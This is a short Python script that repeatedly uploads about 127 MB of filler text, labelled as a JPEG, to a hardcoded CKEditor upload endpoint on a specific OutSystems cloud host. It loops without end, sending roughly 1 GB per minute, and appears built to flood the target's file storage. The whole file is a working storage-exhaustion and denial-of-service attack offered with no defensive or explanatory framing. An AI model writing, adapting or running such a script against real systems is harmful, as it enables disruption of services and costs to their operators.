from colorama import Fore, Style
import requests
import json
import time

def exploit_api_file_storage(environment,component_name):
    url = 'https://personal-fsoujjs3.outsystemscloud.com//CKEditorReactive/rest/api/Upload'
    
    # Preparing the payload

    file = "xxxxx xxxx xxxx xxxxxxxxxxx" * int(10240 * 460) #Bytes 127180800 / MB 127.1808
    data = {
        "name": "upload"  # This name will be associated with the file on the server
    }
    files = {
        "file": ("payload.jpeg", file, "text/plain")  # (filename, content, content-type)
    }
    # Sending payload to target
    send = requests.post(url, data=data, files=files)

    # Check response status
    if send.status_code == 200:
        # Convert the string to a dictionary
        response_dict = json.loads(send.content)
        # Check if "uploaded" is present and equal to 1
        if "uploaded" in response_dict and response_dict["uploaded"] == 1:
            print(f"| Payload stored successfully!")
            print(f"| Payload link: {environment+response_dict['url']}")
        else:
            print(f"| {send.status_code}")
    else:
        print(f"| {send.status_code}")

def attack():
    for i in range(10):
        print(f"Sending payload number:{i}")
        exploit_api_file_storage("null","null")
    time.sleep(60)
    print(f"Waiting 1 minute for the next fragmented 1GB send.")
while True:
    attack()